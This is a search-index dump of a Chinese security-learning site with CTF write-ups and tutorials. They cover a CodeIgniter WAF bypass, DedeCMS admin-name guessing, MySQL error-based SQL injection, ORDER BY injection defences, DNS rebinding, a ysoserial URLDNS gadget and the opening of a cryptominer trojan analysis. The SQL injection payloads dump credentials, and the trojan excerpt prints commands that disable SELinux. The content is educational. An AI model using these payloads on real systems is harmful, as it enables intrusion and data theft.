{"./":{"url":"./","title":"Introduction","keywords":"","body":"简介简介 WeLearn旨在收集，分享，整理安全知识，帮助广大安全爱好者快速学习，逐渐积累所学，最终学有所成。 Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-04 13:25:30 "},"CTF/":{"url":"CTF/","title":"CTF","keywords":"","body":"CTFCTF 整理分享一些有关CTF的题目WriteUp，帮助大家开拓思路 Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-04 10:31:34 "},"CTF/2017_0CTF_simplesqlin.html":{"url":"CTF/2017_0CTF_simplesqlin.html","title":"2017 0 CTF Simplesqlin","keywords":"","body":"2017 0CTF simplesqlin前言详解后记2017 0CTF simplesqlin [摘自]：https://www.yulegeyu.com/2017/03/30/2017-0CTF-simplesqlin/ 前言 没打0ctf, 但是在看大佬们的writeup的时候发现了这道题。 当时就觉得这个绕过莫名其妙, 不知道是怎么写的过滤。 看了几个博客, 好像都不太清楚绕过的原理,就这样测了下就绕过去了。 不过,当看到这题的flag之后,就大概知道为什么在payload之间插入%00这种可以绕过了。flag是flag{W4f_bY_paSS_FOR_CI} 也就是waf bypass for ci, 也就是用了ci框架清除一些字符的特性来bypass了waf. 详解 在system/core/Input.php的构造方法中 public function __construct(){ 省略 $this->_sanitize_globals(); //净化全局变量, } protected function _sanitize_globals(){ // Is $_GET data allowed? If not we'll set the $_GET to an empty array if ($this->_allow_get_array === FALSE) { $_GET = array(); } elseif (is_array($_GET)) { foreach ($_GET as $key => $val) { $_GET[$this->_clean_input_keys($key)] = $this->_clean_input_data($val); } } protected function _clean_input_data($str) { if (is_array($str)) { $new_array = array(); foreach (array_keys($str) as $key) { $new_array[$this->_clean_input_keys($key)] = $this->_clean_input_data($str[$key]); } return $new_array; } /* We strip slashes if magic quotes is on to keep things consistent NOTE: In PHP 5.4 get_magic_quotes_gpc() will always return 0 and it will probably not exist in future versions at all. */ if ( ! is_php('5.4') && get_magic_quotes_gpc()) { $str = stripslashes($str); } // Clean UTF-8 if supported if (UTF8_ENABLED === TRUE) { $str = $this->uni->clean_string($str); } // Remove control characters $str = remove_invisible_characters($str, FALSE); 这里看注释就能大概看出来清掉了哪些啦。 Clean UTF-8 if supported、Remove control characters function remove_invisible_characters($str, $url_encoded = TRUE) { $non_displayables = array(); // every control character except newline (dec 10), // carriage return (dec 13) and horizontal tab (dec 09) if ($url_encoded) { $non_displayables[] = '/%0[0-8bcef]/i'; // url encoded 00-08, 11, 12, 14, 15 $non_displayables[] = '/%1[0-9a-f]/i'; // url encoded 16-31 $non_displayables[] = '/%7f/i'; // url encoded 127 } $non_displayables[] = '/[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F\\x7F]+/S'; // 00-08, 11, 12, 14-31, 127 do { $str = preg_replace($non_displayables, '', $str, -1, $count); } while ($count); return $str; } 这里应该是在清空这些字符之前就检测了字符, 所以呢 这里不止%00能绕过, %12, %80-%99之类的不少字符都能绕过。 后记 后面一开始也在想, 这题都没用ci框架那种常见的url route, 也没看到啥明显的特征提示是ci框架,大家怎么能想到是利用ci框架的这个特性来绕过呢,不过后面发现在404页面中使用的是熟悉的ci框架的404页面, 那么也就很简单了。 Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-04 10:25:15 "},"CTF/dedecms-guess-admin-username-trick.html":{"url":"CTF/dedecms-guess-admin-username-trick.html","title":"Dedecms Guess Admin Username Trick","keywords":"","body":"Dedecms 猜后台管理员账号的一个小技巧寻找后台获取管理员账户Dedecms 猜后台管理员账号的一个小技巧 [摘自]：https://www.yulegeyu.com/2018/09/20/dedecms-guess-admin-username-trick/ 巅峰极客里遇到的一个案例(yx-tv.com)。 寻找后台 案例为,windows下的dedecms 好像是2017版本, 开启了会员中心,修改了后台的路径, 然后用之前windows下dedecms找后台路径的方法, 发现tags.php被删除了, 但是plus/rss.php文件存在, 然后用这方法就成功的找到了后台。 import requests import sys payloads = 'abcdefghijklmnopqrstuvwxyz0123456789_-' menu = '' for k in range(10): for payload in payloads: data = \"dopost=save&_FILES[b4dboy][tmp_name]=../%s%s -1: menu += payload break if payload == '-': print(menu) sys.exit() print(menu) 获取管理员账户 然后猜了下后台的管理员账户, 没猜到, admin直接提示账户不存在。 然后再利用之前的重置管理员密码的漏洞。 https://xz.aliyun.com/t/1959 成功重置了管理员的密码, 但是修改cookie登录后, 发现显示的管理员账号是admin, 但是之前在登录后台的时候试了下admin, 是直接提示的账户不存在。 (好像是显示的是uname, 但是最终登录是看的userid) 后面发现在dede/login.php中 $res = $cuserLogin->checkUser($userid,$pwd); /** * 检验用户是否正确 * * @access public * @param string $username 用户名 * @param string $userpwd 密码 * @return string */ function checkUser($username, $userpwd) { global $dsql; //只允许用户名和密码用0-9,a-z,A-Z,'@','_','.','-'这些字符 $this->userName = preg_replace(\"/[^0-9a-zA-Z_@!\\.-]/\", '', $username); $this->userPwd = preg_replace(\"/[^0-9a-zA-Z_@!\\.-]/\", '', $userpwd); $pwd = substr(md5($this->userPwd), 5, 20); $dsql->SetQuery(\"SELECT admin.*,atype.purviews FROM `#@__admin` admin LEFT JOIN `#@__admintype` atype ON atype.rank=admin.usertype WHERE admin.userid LIKE '\".$this->userName.\"' LIMIT 0,1\"); $dsql->Execute(); $row = $dsql->GetObject(); if(!isset($row->pwd)) { return -1; } else if($pwd!=$row->pwd) { return -2; } else { $loginip = GetIP(); $this->userID = $row->id; $this->userType = $row->usertype; $this->userChannel = $row->typeid; $this->userName = $row->uname; $this->userPurview = $row->purviews; $inquery = \"UPDATE `#@__admin` SET loginip='$loginip',logintime='\".time().\"' WHERE id='\".$row->id.\"'\"; $dsql->ExecuteNoneQuery($inquery); $sql = \"UPDATE #@__member SET logintime=\".time().\", loginip='$loginip' WHERE mid=\".$row->id; $dsql->ExecuteNoneQuery($sql); return 1; } } 先通过用户输入的用户名查询出密码, 如果有记录的话, 就比对密码。 但是在这里 根据用户名查询密码的时候 WHERE admin.userid LIKE '\".$this->userName.\" 竟然是用的like。 $this->userName = preg_replace(\"/[^0-9a-zA-Z_@!\\.-]/\", '', $username); 虽然在前面有把一些用户名不允许的字符给替换为空了, 想直接用%这种匹配任意数量字符的模糊查询出数据就不行了。 但是可以看到这个过滤没有把_替换为空。 With LIKE you can use the following two wildcard characters in the pattern: % matches any number of characters, even zero characters. _ matches exactly one character. 在mysql中的模糊查询中, _也代表着匹配一个任意字符。 所以在不知道管理员的用户名的情况下， 只要去用跑一下, 当的位数和管理员账户的位数相同时即可登录成功了。 巅峰极客的是4位数, 然后用之前修改管理员密码的洞修改的密码, 就成功登录了后台, 然后后台getshell, 就搞定了。 Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-05 13:50:08 "},"Web安全/":{"url":"Web安全/","title":"Web安全","keywords":"","body":"Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-05 10:22:18 "},"Web安全/SQLi/":{"url":"Web安全/SQLi/","title":"SQ Li","keywords":"","body":"Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-05 10:23:22 "},"Web安全/SQLi/Mysql/":{"url":"Web安全/SQLi/Mysql/","title":"Mysql","keywords":"","body":"Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-05 13:42:57 "},"Web安全/SQLi/Mysql/MySQL-报错注入总结.html":{"url":"Web安全/SQLi/Mysql/MySQL-报错注入总结.html","title":"MySQL-报错注入总结","keywords":"","body":"MySQL 报错注入总结前言报错注入（Error based Injection）MySQL 测试数据floor()注入语句语句拆分报错原理测试extractvalue()注入语句报错原理测试updatexml()注入语句报错原理测试exp()注入语句报错原理测试MySQL 报错注入总结 [摘自]：https://v0w.top/2018/08/03/MySQL%20%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5 前言 利用数据库报错来显示数据的注入方式经常会在入侵中利用到，这种方法有一点局限性，需要页面有错误回显。 而MySQL的报错方式很多，以前就接触到很多，最近也是做了一些关于这方面CTF的题目，学习到很多之前遗漏的姿势，故总结一下,以免遗忘。 报错注入（Error based Injection） MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类： BigInt等数据类型溢出 xpath语法错误 count()+rand()+group_by()导致逐渐重复 空间数据类型函数错误 很多函数会导致MySQL报错并显示出数据。 floor() extractvalue() updatexml() exp() MySQL 测试数据 CREATE TABLE IF NOT EXISTS `user` ( `id` int(10) NOT NULL, `Username` varchar(20) NOT NULL, `Age` int(10) NOT NULL, `Password` varchar(20) NOT NULL ) ENGINE=MyISAM DEFAULT CHARSET=latin1; INSERT INTO `user` (`id`, `Username`, `Age`, `Password`) VALUES (1, 'olivia', 18, 'slimslim'), (2, 'qingchen', 18, 'meimima123'), (3, 'hack', 1, 'love_pwn'), (4, 'someome', 3, 'p@55w0rd'); floor() 注入语句 mysql> select * from user where id=1 and (select 1 from (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x from user group by x)a); 简化为： mysql> SELECT COUNT(*) FROM user GROUP BY FLOOR(RAND(0)*2); ERROR 1062 (23000): Duplicate entry '1' for key '' floor：函数只返回整数部分，小数部分舍弃。 round：函数四舍五入，大于0.5的部分进位，不到则舍弃。 语句拆分 (select 1 from a) //在a上做派生表 b=select count(*),x from user group by x //从user里面选取那么的内容和计数的内容 name=concat((查询内容),floor(rand(0)*2)) //把查询内容和随机取整数 连接在一起 报错原理 目前比较常见的几种报错注入的方法都是利用了mysql某些不能称为bug的bug(feature)来实现的。 下面就以 rand() 函数来进行说明。mysql的官方文档中对 rand() 函数有特殊的说明： RAND() in a WHERE clause is re-evaluated every time the WHERE is executed. You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. However, you can retrieve rows in random order like this 官方文档中的意思是：在where语句中，where每执行一次，rand()函数就会被计算一次。rand()不能作为order by的条件字段，同理也不能作为group by的条件字段。 因此在mysql中，可以构造一个值不确定而有可重复的字段作为group by的条件字段，这是就可以报出类似于Duplicate entry '…' for key 'group_key'的错误。 另外，经过测试 rand()会随机报错，就是有可能报错，有的时候不会， rand(0)肯定会报错，rand(1)则一定不会报错。 所以要让他报错的话直接用rand(0) 测试 mysql> select * from user where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from user group by x)a); ERROR 1062 (23000): Duplicate entry 'root@localhost1' for key '' mysql> select * from user where id=1 and (select 1 from (select count(*),concat(database(),'|',floor(rand(0)*2))x from user group by x)a); ERROR 1062 (23000): Duplicate entry 'test|1' for key '' mysql> select * from user where id=1 and (select 1 from (select count(*),concat(table_name,floor(rand(0)*2))x from information_schema.tables group by x)a); ERROR 1062 (23000): Duplicate entry 'global_status0' for key '' extractvalue() MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML() 因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。 注入语句 select * from user where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); 报错原理 EXTRACTVALUE (XML_document, XPath_string); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串). 作用：从目标XML中返回包含所查询值的字符串 第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里 测试 mysql> select * from user where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~' mysql> select * from user where id=1 and (extractvalue(1,concat(0x7e,(select database()),0x7e))); ERROR 1105 (HY000): XPATH syntax error: '~test~' mysql> select * from user where id=1 and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='test'),0x7e))); ERROR 1105 (HY000): XPATH syntax error: '~user~' select * from user where id=1 and (extractvalue(1,concat(0x7e,(select group_concat(comlumn_name) from information_schema.columns where table_schema='test' and table_name='user'),00x7e))); ERROR 1105 (HY000): XPATH syntax error: '~id,Username,Age,Password~' mysql> select * from user where id=1 and (extractvalue(1,concat(0x7e,(select concat(id,'|',Username,'|',Password) from user where id=1),0x7e))); ERROR 1105 (HY000): XPATH syntax error: '~1|olivia|slimslim~' mysql> select * from user where id=1 and (extractvalue(1,concat(0x7e,(select group_concat(password) from user),0x7e))); ERROR 1105 (HY000): XPATH syntax error: '~slimslim,meimima123,love_pwn,p@' 值得注意的是，extractvalue()报错长度是有限制的,最长32位。（从最后一句测试，也可以看出） updatexml() MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML() 因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。 注入语句 select * from user where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); 报错原理 UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。 其实原理和extractvalue()是一样的，利用Xpath格式字符串不符合要求达到报错的效果，但是不一样的是，updatexml()有3个参数，要注意这一点。 测试 mysql> select * from user where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~' mysql> select * from user where id=1 and (updatexml(1,concat(0x7e,(select database()),0x7e),1)); ERROR 1105 (HY000): XPATH syntax error: '~test~' mysql> select * from user where id=1 and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='test'),0x7e),1)); ERROR 1105 (HY000): XPATH syntax error: '~user~' mysql> select * from user where id=1 and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='test' and table_name='user'),0x7e),1)); ERROR 1105 (HY000): XPATH syntax error: '~id,Username,Age,Password~' mysql> select * from user where id=1 and (updatexml(1,concat(0x7e,(select concat(id,'|',Username,'|',Password) from user where id=1),0x7e),1)); ERROR 1105 (HY000): XPATH syntax error: '~1|olivia|slimslim~' mysql> select * from user where id=1 and (updatexml(1,concat(0x7e,(select group_concat(password) from user),0x7e),1)); ERROR 1105 (HY000): XPATH syntax error: '~slimslim,meimima123,love_pwn,p@' 值得注意的是，updatexml()和extractvalue()一样，报错长度是有限制的,最长32位。（从最后一句测试，也可以看出） exp() 在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。 利用exp函数也产生类似的溢出错误 注入语句 mysql> select exp(~(select * from(select database())x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select `x`.`database()` from (select database() AS `database()`) `x`)))' 注意，exp()产生错误，但是并没有爆出database()，但是发现database() 是表达式，在脚本语言中会转化为相应的值，从而爆出数据库名。 报错原理 exp是以e为底的指数函数，但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。 mysql> select exp(709); +-----------------------+ | exp(709) | +-----------------------+ | 8.218407461554972e307 | +-----------------------+ 1 row in set (0.00 sec) mysql> select exp(710); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)' 将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。 mysql> select ~0; +----------------------+ | ~0 | +----------------------+ | 18446744073709551615 | +----------------------+ 1 row in set (0.00 sec) mysql> select ~(select version()); +----------------------+ | ~(select version()) | +----------------------+ | 18446744073709551610 | +----------------------+ 1 row in set, 1 warning (0.00 sec) 我们通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。 mysql> select exp(~(select * from(select database())x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select `x`.`database()` from (select database() AS `database()`) `x`)))' 在脚本语言中，就会将错误中的一些表达式转化成相应的字符串,从而爆出数据。 测试 由于exp()报错的表达式在脚本语言中才会转化为相应的值，下面用实验吧上一道题目来演示说明exp()报错注入。 username=&password=' or exp(~(select * from(select database())x)) or' DOUBLE value is out of range in 'exp(~((select 'error_based_hpf' from dual)))' username=&password=' or exp(~(select * from(select group_concat(table_name) from information_schema.tables where !(table_schema <> database()))a)) or ' DOUBLE value is out of range in 'exp(~((select 'ffll44jj,users' from dual)))' username=&password=' or exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj')a)) or ' DOUBLE value is out of range in 'exp(~((select 'value' from dual)))' username=&password=' or exp(~(select * from(select value from ffll44jj)z)) or ' DOUBLE value is out of range in 'exp(~((select 'flag{err0r_b4sed_sqli_+_hpf}' from dual)))' Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-30 13:27:54 "},"Web安全/SQLi/Mysql/为什么-backtick-能做注释符.html":{"url":"Web安全/SQLi/Mysql/为什么-backtick-能做注释符.html","title":"为什么-backtick-能做注释符","keywords":"","body":"为什么 `(backtick) 能做注释符前言解答那为什么有时候backtick 又不能当做注释符呢?为什么 `(backtick) 能做注释符 [摘自]：https://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/ 前言 很久以前的一个Paper,介绍了mysql下的注释符,里面包含了两种不常见的\"注释符\"。 今天有小伙伴刚好来问了一下我, 为啥 ` 做注释符时,并不是通用的, 也就是有时候并不能注释掉,不能像#这种注释符通用。 其实paper里的NOTE已经基本解答了这个问题,不过NOTE写的是只能用在别名处 The backtick can only be used to end a query when used as an alias. 他给我的语句类似于 select * from qs_members where username = 'x' and password = 'x'; 然后他盲注,插入 payload 1' and if(substr((select password from qs_admin limit 1),1,1)='a',sleep(1),1)` 语句就成了 select * from qs_members where username='1'and if(substr((select password from qs_admin limit 1),1,1)='a',sleep(1),1)` and password='admin'; 然后这时候语句就开始报错了, 但是如果把 ` 换成#,语句就能正常执行, 说明这个时候 ` 没有了注释效果。 解答 首先来看一下mysql手册的comment Syntax From a # character to the end of the line. From a – sequence to the end of the line. In MySQL, the – (double-dash) comment style requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on). This syntax differs slightly from standard SQL comment syntax, as discussed in Section 1.8.2.4, “'–' as the Start of a Comment”. From a / sequence to the following / sequence, as in the C programming language. This syntax enables a comment to extend over multiple lines because the beginning and closing sequences need not be on the same line. 官方所介绍的注释只有前三种, ` 并不是一个真正的注释符, 而是一个identifier quote。 Backticks for enclosing identifiers such as table and column names, Backticks are generally used to indicate an identifier and as well be safe from accidentally using the Reserved Keywords. 一般用来引住表名,列名,别名。 那为什么backtick 能当作\"注释符\"呢, 其实这是因为, 在mysql query 执行sql的时候, 不知道啥原因(翻了会google也没找到具体的解,感觉还是最后的时候mysql给它给闭合了?) backtick在不闭合的情况下, 也能够正常执行。 别名、表名、列名在backtick的引用下,可以写任意字符。 所以 select username from qs_members where username = '' and password = ''; 我们在username处插入 yu' union select 1 from qs_admin ` 语句就成了 select username from qs_members where username = 'yu' union select 1 from qs_admin `' and password = '' 给起别名的时候,as是可以省略的, 所以后面的' and password = '' 这些字符都成了qs_admin表的别名, 也就相当于成了一个\"注释符\",让后面的内容不再有以前的效果。 那为什么有时候backtick 又不能当做注释符呢? select * from qs_members where username='1' and if(substr((select password from qs_admin limit 1),1,1)='a',sleep(1),1)` and password='admin'; 像上面我小伙伴失败的那个语句, 很明显backtick在的这个地方, 是一个不允许起别名的地方,所以语句就报错了。 还有一种失败的情况是, 当sql语句为 select * from xxx where `username` = 'a' union select 1,2` and `password`='xxxx' 很多查询会把column用 ` 给引住, 在这种情况下, ` 也不能当作注释符, 因为我们插的 ` 和后面一个列的 ` 所闭合, 导致了没办法当作注释。 所以呢,backtick要起一个注释效果, 是需要在允许写表名、列名、别名的地方。 那么盲注、报错之类不用union的注入, 如何使用backtick 来注释呢。 方法很多, 比如可以找一个可以用列名的地方, 例如 order by,having 之类的。 Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-05 13:44:33 "},"Web安全/SQLi/通用问题/":{"url":"Web安全/SQLi/通用问题/","title":"通用问题","keywords":"","body":"Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-05 10:23:32 "},"Web安全/SQLi/通用问题/为什么感觉在实际的测试中ORDER_BY注入的比例变高了.html":{"url":"Web安全/SQLi/通用问题/为什么感觉在实际的测试中ORDER_BY注入的比例变高了.html","title":"为什么感觉在实际的测试中ORDER_BY注入的比例变高了","keywords":"","body":"为什么感觉在实际的测试中ORDER BY注入的比例变高了前言解读防御方案框架防御为什么感觉在实际的测试中ORDER BY注入的比例变高了 [摘自]：https://www.yulegeyu.com/2017/04/04/%E4%B8%BA%E4%BB%80%E4%B9%88%E6%84%9F%E8%A7%89%E5%9C%A8%E5%AE%9E%E9%99%85%E7%9A%84%E6%B5%8B%E8%AF%95%E4%B8%ADORDER-BY%E6%B3%A8%E5%85%A5%E7%9A%84%E6%AF%94%E4%BE%8B%E5%8F%98%E9%AB%98%E4%BA%86/ 前言 之前去阿里先知大会的时候, 在听greg.wu的议题的时候, 听到他提了一下他挖order by注入的比例占所有注入比例的20-30%(如果没记错的话) 自己在各种测试的过程中,发现的order by注入也确实不少, 每次看到order,sort之类的参数都会有点小兴奋。 那为什么在现在sql注入越来越少的情况下,order by注入的比例还不低呢？ 解读 我感觉是因为常见的查询,直接自己预编译或者用框架里的一些方法就能防止掉注入。 但是order by time这种排序是不能通过直接预编译来搞的, 因为如果直接像java里的preparestement来预编译 order by ?, setString(1,”time”); 最后的sql语句就变成了 order by \"time\" 对一个字符串排序是没有效果的,所以一些人就又直接把order拼接之类的导致了注入。 而且order by 这种排序在程序中却用得不少, 因为有时候要根据用户的要求来排序, 就像网上商城那种即可以用销量来对商品进行排序,也可以用价格之类的来排序, 这时候就得根据用户传递进来的值来进行相应的排序. 防御方案 那么一般是如何来防止ORDER BY注入的呢。 如果不利用框架来防止的话,我见过比较常用的两种是 从数据库中查询出来要排序的表中的所有列, 或者就是指定的几个列名,如果用户传递的sort变量不在允许的范围内的话,再把sort变量重置一下。 $sort = $_GET['sort']; if(!in_array($sort,array('time','price'))){ $sort = 'time'; } 还见得比较多的一种就是用户直接传的是数字, 不过以下这种写法,千万别忘啦default,没default的话,又注入咯。 $sort = $_GET['sort']; switch($sort){ case 1: $sort = 'time'; break; case 2: $sort = 'price'; break; default: $sort = 'time'; break; } 框架防御 至于框架对于order by的防御, 有一些框架有防御, 部分没有。 我见过的两种框架防御order by注入的 一种是判断用户传递的是不是实体类的属性(hibernate), 如果order的参数不是实体类里的属性就直接报错了。 还有一种就是 用户传递进去的字符串, 给你强行加上 ` , 再对用户传递进来的字符串清掉 ` , 或者对 ` 转义。 Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-05 10:26:38 "},"Web安全/其他/":{"url":"Web安全/其他/","title":"其他","keywords":"","body":"Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-09 11:40:33 "},"Web安全/其他/DNS-Rebinding.html":{"url":"Web安全/其他/DNS-Rebinding.html","title":"DNS Rebinding","keywords":"","body":"DNS Rebinding什么是DNS Rebinding攻击步骤同源策略的失效DNS Rebinding [原创] 什么是DNS Rebinding 在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。 攻击步骤 攻击者控制恶意的DNS服务器来回复域的查询,如rebind.network 攻击者通过一些方式诱导受害者加载http://rebind.network 用户打开链接,浏览器就会发出DNS请求查找rebind.network的IP地址 恶意DNS服务器收到受害者的请求,并使用真实IP地址进行响应,并将TTL值设置为1秒,让受害者的机器缓存很快失效 从http://rebind.network加载的网页包含恶意的js代码,构造恶意的请求到http://rebind.network/index,而受害者的浏览器便在执行恶意请求 一开始的恶意请求当然是发到了攻击者的服务器上,但是随着TTL时间结束,攻击者就可以让http://rebind.network绑定到别的IP,如果能捕获受害者的一些放在内网的应用IP地址,就可以针对这个内网应用构造出对应的恶意请求,然后浏览器执行的恶意请求就发送到了内网应用,达到了攻击的效果 同源策略的失效 对于WEB的同源策略相信大家都很熟悉,如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源,而不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。 当然,页面中的链接，重定向以及表单提交是不会受到同源策略限制的,并且,跨域资源的引入是可以的。但是js不能读写加载的内容。 同源策略确实提高了web的安全性,但是对于DNS Rebinding来说是没有作用的,因为同源策略看的是域名,并不是背后的IP地址,虽然两次的请求IP地址不同,但是由于DNS服务器的绑定,域名都是一样的,那么自然不违反同源策略. Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-09 11:41:40 "},"Web安全/反序列化/":{"url":"Web安全/反序列化/","title":"反序列化","keywords":"","body":"Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-18 09:36:16 "},"Web安全/反序列化/java/":{"url":"Web安全/反序列化/java/","title":"Java","keywords":"","body":"Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-18 09:36:22 "},"Web安全/反序列化/java/ysoserial_gadget之DNSURL_gadget分析及实战利用.html":{"url":"Web安全/反序列化/java/ysoserial_gadget之DNSURL_gadget分析及实战利用.html","title":"ysoserial_gadget之DNSURL_gadget分析及实战利用","keywords":"","body":"ysoserial gadget之DNSURL gadget分析及实战利用payload分析实战cve-2020-2551 weblogic iiop反序列化漏洞ysoserial gadget之DNSURL gadget分析及实战利用 [摘自]：https://www.cnblogs.com/unicodeSec/p/12551313.html payload HashMap ht = new HashMap(); URL u = new URL(url); Reflections.setFieldValue(u, \"hashCode\", -1); 分析 查看gadget调用链 * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() 首先查看HashMap的ReadObject 方法。重点查找在哪里调用putVal方法。 // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i 在调用putVal方法之前会调用hash方法，查看一下源代码 static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16); } 如果key不存在的话，hashcode为0。如果key存在的话，则调用key的hashcode方法。在gadget中，key为URL类。所以我们去查看URL的hashCode方法。如下 public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } URL类的hashCode很简单。如果hashcode不为-1，则返回hashcode。这也就是前面在构造payload的时候，需要设置hashcode为-1的原因。 随后调用handler的hashCode方法。该类的定义在URL的构造函数中，主要是根据scheme去决定用什么类做handler。例如http等。在这里，理所当然是URLStreamHandler类。所以查看一下URLStreamHandler的hashcode方法 protected int hashCode(URL u) { int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) { h += addr.hashCode(); } else { String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); } } 可以看出，这里调用了getHostAddress，也就是这里会触发dns查询。完成dnslog的gadget工作 实战 这个gadget一般不受jdk版本限制，很适合用来检测目标站点是否存在java反序列化。 cve-2020-2551 weblogic iiop反序列化漏洞 网络上公开的exp，都是基于rmi去执行。但是rmi在高版本jdk被限制了，而且如果是检测的话，很难构造。这时候我们可以使用dnsurl去检测weblogic是否存在iiop反序列化漏洞。代码如下 dnsUrl = String.format(\"http://%s\", dnsUrl.trim()); Context context = createIIopContext(ip, port); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(dnsUrl); // URL to use as the Key ht.put(u, dnsUrl); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. final Field field = getField(u.getClass(), \"hashCode\"); field.set(u, -1); context.rebind(\"Fucker\"+System.nanoTime(), ht); Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-18 09:39:58 "},"主机安全/":{"url":"主机安全/","title":"主机安全","keywords":"","body":"主机安全主机安全 整理分享一些有关主机安全相关资料 Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-09 18:40:18 "},"主机安全/木马分析/":{"url":"主机安全/木马分析/","title":"木马分析","keywords":"","body":"Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-09 18:40:43 "},"主机安全/木马分析/Trojan.SH.MALXMR.UWEKB-分析.html":{"url":"主机安全/木马分析/Trojan.SH.MALXMR.UWEKB-分析.html","title":"Trojan.SH.MALXMR.UWEKB-分析","keywords":"","body":"Trojan.SH.MALXMR.UWEKB 分析声明一、木马信息二、木马分析Trojan.SH.MALXMR.UWEKB 分析 [原创] 声明 本文为纯技术分析文章，意在为广大安全运维工作者对木马基本行为进行排查，切不可用作非法工作使用。文中代码为片段截取，不能直接运行。任何用作非法用途与本人无关。 一、木马信息 trendmicro 此木马功能较为齐全，包含关闭机器防护措施，识别并关闭云防护模块（阿里云防护模块，腾讯云镜），删除其他竞品木马及挖矿程序，内网横向移动等。 二、木马分析 临时关闭 selinux 防火墙（重启恢复） setenforce 0 2>dev/null 永久关闭 selinux 防火墙 echo SELINUX=disabled 